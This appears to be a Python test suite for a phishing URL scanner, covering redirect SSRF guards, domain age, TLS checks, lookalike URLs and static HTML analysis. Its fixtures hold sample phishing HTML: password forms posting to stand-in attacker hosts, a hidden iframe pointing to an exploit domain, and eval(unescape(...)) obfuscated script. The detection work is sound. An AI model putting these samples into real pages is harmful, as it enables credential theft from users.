"""
Unit and Integration Tests for URL Scanner Forensic Enhancements:
1. Redirect Chain Visualizer with Hop-by-Hop SSRF Guard
2. Domain Intelligence (RDAP age < 30 days, registrar)
3. TLS Certificate Check (issuer, expiry, self-signed, hostname mismatch)
4. Lookalike Detection (punycode, typosquatting, IP host, '@', excessive subdomains, risky TLDs)
5. Threat Feeds Availability and Fallback (Safe Browsing, URLhaus, OpenPhish/PhishTank)
6. Static Page Analysis (password fields, cross-domain forms, hidden iframes, obfuscated JS, brand-in-title mismatch)
"""

import pytest
from unittest.mock import patch, MagicMock
from backend.services.redirects import trace_redirects, SSRFSecurityException
from backend.services.domain_intel import check_tls_certificate, query_rdap_domain_age, get_domain_intelligence
from backend.services.heuristics import evaluate_heuristics, check_brand_lookalike, levenshtein_distance
from backend.services.static_analysis import analyze_html_text, fetch_and_analyze_page
from backend.services.openphish import query_openphish
from backend.services.orchestrator import scan_url, clear_scan_cache


# ---------------------------------------------------------
# 1. REDIRECT CHAIN VISUALIZER & HOP-BY-HOP SSRF GUARD
# ---------------------------------------------------------
def test_redirect_chain_hop_tracking():
    mock_resp1 = MagicMock()
    mock_resp1.status_code = 301
    mock_resp1.headers = {"Location": "https://hop2.example.com/intermediate"}

    mock_resp2 = MagicMock()
    mock_resp2.status_code = 200
    mock_resp2.headers = {}

    with patch("backend.services.redirects.resolve_and_verify_hostname", return_value=["93.184.216.34"]):
        with patch("requests.Session.get", side_effect=[mock_resp1, mock_resp2]):
            res = trace_redirects("https://start.example.com", max_hops=10, timeout_per_hop=5.0)

            assert res["hops_count"] == 2
            assert res["is_redirected"] is True
            assert res["final_url"] == "https://hop2.example.com/intermediate"

            chain = res["chain"]
            assert len(chain) == 2
            assert chain[0]["status_code"] == 301
            assert chain[0]["domain"] == "start.example.com"
            assert chain[1]["status_code"] == 200
            assert chain[1]["domain"] == "hop2.example.com"


def test_redirect_chain_ssrf_blocked_on_second_hop():
    mock_resp1 = MagicMock()
    mock_resp1.status_code = 302
    mock_resp1.headers = {"Location": "http://192.168.1.1/admin"}

    def fake_resolve(hostname):
        if hostname == "192.168.1.1" or "192.168" in hostname:
            raise SSRFSecurityException("Destination IP is within restricted network 192.168.0.0/16.")
        return ["93.184.216.34"]

    with patch("backend.services.redirects.resolve_and_verify_hostname", side_effect=fake_resolve):
        with patch("requests.Session.get", return_value=mock_resp1):
            res = trace_redirects("https://safe-domain.example.com/login", max_hops=10)

            assert any(s["id"] == "ssrf_blocked" for s in res["signals"])
            assert res["chain"][-1]["status_code"] == 403
            assert "Blocked by SSRF Guard" in res["chain"][-1]["reason"]


# ---------------------------------------------------------
# 2. DOMAIN INTELLIGENCE (RDAP / AGE / REGISTRAR)
# ---------------------------------------------------------
def test_domain_intelligence_flags_young_domain_under_30_days():
    fake_rdap = {
        "status": "success",
        "registrable_domain": "newlyregisteredphish.top",
        "registered_date": "2026-11-01T00:00:00Z",
        "age_days": 11,
        "registrar": "NameCheap, Inc."
    }

    with patch("backend.services.domain_intel.query_rdap_domain_age", return_value=fake_rdap):
        with patch("backend.services.domain_intel.check_tls_certificate", return_value={"has_tls": False}):
            with patch("geo_resolver.resolve_geo_ip", return_value={"status": "unavailable"}):
                res = get_domain_intelligence("https://newlyregisteredphish.top/account")
                young_signals = [s for s in res["signals"] if s["id"] == "young_domain"]
                assert len(young_signals) == 1
                assert young_signals[0]["severity"] == "critical"
                assert "11 days ago" in young_signals[0]["evidence"]


# ---------------------------------------------------------
# 3. TLS CERTIFICATE CHECK (ISSUER, EXPIRY, MISMATCH, SELF-SIGNED)
# ---------------------------------------------------------
def test_tls_check_flags_self_signed():
    import ssl
    err = ssl.SSLCertVerificationError(1, "[SSL: CERTIFICATE_VERIFY_FAILED] certificate is self-signed (_ssl.c:1000)")
    mock_ctx = MagicMock()
    mock_ctx.wrap_socket.side_effect = err
    with patch("ssl.create_default_context", return_value=mock_ctx):
        with patch("socket.create_connection"):
            res = check_tls_certificate("selfsigned.badssl.com", port=443)
            assert res["has_tls"] is True
            assert res["valid"] is False
            assert res["is_self_signed"] is True


def test_tls_check_flags_hostname_mismatch():
    fake_cert = {
        "issuer": ((("organizationName", "DigiCert"),),),
        "subject": ((("commonName", "differenthost.org"),),),
        "notAfter": "Dec 31 23:59:59 2030 GMT",
        "subjectAltName": (("DNS", "differenthost.org"),)
    }

    mock_sock = MagicMock()
    mock_ssock = MagicMock()
    mock_ssock.getpeercert.return_value = fake_cert
    mock_sock.__enter__.return_value = mock_sock
    mock_ssock.__enter__.return_value = mock_ssock

    with patch("socket.create_connection", return_value=mock_sock):
        with patch("ssl.SSLContext.wrap_socket", return_value=mock_ssock):
            res = check_tls_certificate("targethost.com", port=443)
            assert res["has_tls"] is True
            assert res["hostname_mismatch"] is True
            assert res["valid"] is False


def test_tls_check_flags_expired():
    fake_cert = {
        "issuer": ((("organizationName", "Let's Encrypt"),),),
        "subject": ((("commonName", "expired.com"),),),
        "notAfter": "Jan 01 00:00:00 2020 GMT",
        "subjectAltName": (("DNS", "expired.com"),)
    }

    mock_sock = MagicMock()
    mock_ssock = MagicMock()
    mock_ssock.getpeercert.return_value = fake_cert
    mock_sock.__enter__.return_value = mock_sock
    mock_ssock.__enter__.return_value = mock_ssock

    with patch("socket.create_connection", return_value=mock_sock):
        with patch("ssl.SSLContext.wrap_socket", return_value=mock_ssock):
            res = check_tls_certificate("expired.com", port=443)
            assert res["has_tls"] is True
            assert res["is_expired"] is True
            assert res["valid"] is False


# ---------------------------------------------------------
# 4. LOOKALIKE DETECTION & STRUCTURAL ANOMALIES
# ---------------------------------------------------------
def test_lookalike_punycode_detection():
    # Punycode homograph targeting apple
    res = evaluate_heuristics("https://xn--pple-43d.com/login")
    assert any(s["id"] == "punycode_homograph" for s in res["signals"])


def test_lookalike_typosquatting_levenshtein():
    lookalike = check_brand_lookalike("paypa1.com")
    assert lookalike["is_lookalike"] is True
    assert lookalike["brand"] == "paypal"

    res = evaluate_heuristics("https://paypa1.com/verify")
    assert any(s["id"] == "brand_lookalike" for s in res["signals"])


def test_lookalike_ip_literal_host():
    res = evaluate_heuristics("http://198.51.100.22/update")
    assert any(s["id"] == "ip_literal_host" for s in res["signals"])


def test_lookalike_at_delimiter():
    res = evaluate_heuristics("https://google.com@evil-attacker.com/session")
    assert any(s["id"] == "at_delimiter" for s in res["signals"])


def test_lookalike_excessive_subdomains():
    res = evaluate_heuristics("https://a.b.c.d.suspicious.com/path")
    assert any(s["id"] == "excessive_subdomains" for s in res["signals"])


def test_lookalike_risky_tld():
    res = evaluate_heuristics("https://secure-login.buzz/auth")
    assert any(s["id"] == "risky_tld" for s in res["signals"])


# ---------------------------------------------------------
# 5. THREAT FEEDS AVAILABILITY & FALLBACK
# ---------------------------------------------------------
def test_threat_feed_graceful_fallback():
    # If API keys are missing or offline, should report UNAVAILABLE and not crash
    with patch("backend.services.openphish.get_cached_feed_urls", return_value=set()):
        with patch.dict("os.environ", {"PHISHTANK_API_KEY": ""}):
            res = query_openphish("https://clean-example.com")
            assert res["status"] in ("SAFE", "UNAVAILABLE")
            assert "signal" in res


# ---------------------------------------------------------
# 6. STATIC PAGE ANALYSIS
# ---------------------------------------------------------
def test_static_analysis_password_field():
    html = """
    <html>
      <head><title>Account Sign-In</title></head>
      <body>
        <form action="/login" method="POST">
          <input type="text" name="username">
          <input type="password" name="userpass">
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
    """
    res = analyze_html_text(html, "http://phish-site.org/login")
    assert res["has_password_field"] is True
    assert any(s["id"] == "html_password_field" for s in res["signals"])


def test_static_analysis_cross_domain_form_action():
    html = """
    <html>
      <head><title>Portal Login</title></head>
      <body>
        <form action="https://attacker-harvester.com/steal" method="POST">
          <input type="password" name="password">
          <input type="submit" value="Submit">
        </form>
      </body>
    </html>
    """
    res = analyze_html_text(html, "https://portal.legit-lookalike.com/auth")
    assert len(res["cross_domain_forms"]) == 1
    assert res["cross_domain_forms"][0]["target_host"] == "attacker-harvester.com"
    assert any(s["id"] == "cross_domain_form" for s in res["signals"])


def test_static_analysis_hidden_iframe():
    html = """
    <html>
      <head><title>Welcome</title></head>
      <body>
        <iframe src="https://exploit-payload.com/drop" style="display:none; width:0px; height:0px;"></iframe>
      </body>
    </html>
    """
    res = analyze_html_text(html, "https://innocent-looking.com")
    assert res["hidden_iframes_count"] == 1
    assert any(s["id"] == "hidden_iframe" for s in res["signals"])


def test_static_analysis_obfuscated_js():
    html = """
    <html>
      <head><title>Loading</title></head>
      <body>
        <script>
          eval(unescape('%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E'));
        </script>
      </body>
    </html>
    """
    res = analyze_html_text(html, "https://dropper-script.com")
    assert len(res["js_obfuscation"]) > 0
    assert any(s["id"] == "obfuscated_js" for s in res["signals"])


def test_static_analysis_brand_in_title_mismatch():
    html = """
    <html>
      <head><title>PayPal - Account Security Verification Required</title></head>
      <body>
        <h1>Verify your card</h1>
      </body>
    </html>
    """
    res = analyze_html_text(html, "https://account-verify-update.info/login")
    assert res["impersonated_brand"] == "paypal"
    assert any(s["id"] == "title_brand_mismatch" for s in res["signals"])


def test_full_pipeline_orchestrator_integration():
    clear_scan_cache()
    # Test end-to-end integration with static analysis in orchestrator
    with patch("backend.services.redirects.resolve_and_verify_hostname", return_value=["93.184.216.34"]):
        with patch("backend.services.static_analysis.requests.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.headers = {"Content-Type": "text/html; charset=utf-8"}
            mock_resp.raw.read.return_value = b"<html><head><title>PayPal Secure Login</title></head><body><form action='https://evil.ru/post'><input type='password' name='p'></form></body></html>"
            mock_get.return_value = mock_resp

            report = scan_url("https://paypa1-update.xyz/verify", bypass_cache=True)
            assert report["status"] in ("SUSPICIOUS", "MALICIOUS")
            assert "static_analysis" in report
            assert report["static_analysis"]["has_password_field"] is True
            assert report["static_analysis"]["impersonated_brand"] == "paypal"
            assert any(s["id"] == "title_brand_mismatch" for s in report["signals"])
